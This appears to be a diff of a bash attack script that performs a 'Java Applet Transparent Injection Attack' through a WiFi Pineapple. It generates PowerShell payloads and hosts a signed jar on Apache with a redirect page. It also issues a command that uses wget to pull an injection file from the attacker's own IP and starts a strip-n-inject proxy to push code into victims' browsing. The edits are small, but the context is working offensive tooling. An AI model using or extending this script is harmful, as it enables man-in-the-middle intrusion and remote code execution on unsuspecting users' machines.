@@ -22,6 +22,7 @@ java_www="/var/www/java-applet-injector"
 # Start Function
 function start_javaappletinjector(){
   echo -e "\e[01;34m[>]\e[00m Running Java Applet Transparent Injection Attack..."  
+  if [ ! -e "${java_www}" ]; then mkdir "${java_www}" ; fi
   
   # Create our powershell payload
   echo -e "\e[01;34m[>]\e[00m Generating x86 and x64 PowerShell code..."  
@@ -58,7 +59,6 @@ function start_javaappletinjector(){
 
   # Just keep the victim off our server other than payload downloads
   echo -e "\e[01;34m[>]\e[00m Setting up Apache server...."  
-  if [ ! -e "${java_www}" ]; then mkdir "${java_www}" ; fi
 
   echo -e '<html>\n<head><meta http-equiv="refresh" content="0; url=http://yahoo.com/"></head></html>' 1> ${java_www}/index.html 2> /dev/null
   cp src/Signed_Update.jar "${java_www}/" 2> /dev/null
@@ -133,7 +133,7 @@ function start_javaappletinjector(){
 
   # Start up code injector for java applet injection
   echo -e "\e[01;34m[>]\e[00m Enabling code injection on pineapple.."    
-  command="killall -9 python ; wget -O /pineapple/components/infusions/strip-n-inject/includes/proxy/injection.txt http://${our_ip}/injectme.txt ; echo ${our_ip} > /pineapple/components/infusions/strip-n-inject/includes/proxy/attacker_ip.txt ; cd /pineapple/components/infusions/strip-n-inject/includes/ ; bash start.sh &"
+  command="killall -9 python ; wget -O /pineapple/components/infusions/strip-n-inject/includes/proxy/injection.txt http://${our_ip}/injectme.txt ; echo ${our_ip} > /pineapple/components/infusions/strip-n-inject/includes/proxy/attacker_ip.txt ; cd /pineapple/components/infusions/strip-n-inject/includes/ ; bash start.sh"
   pineapple_command
 }
 
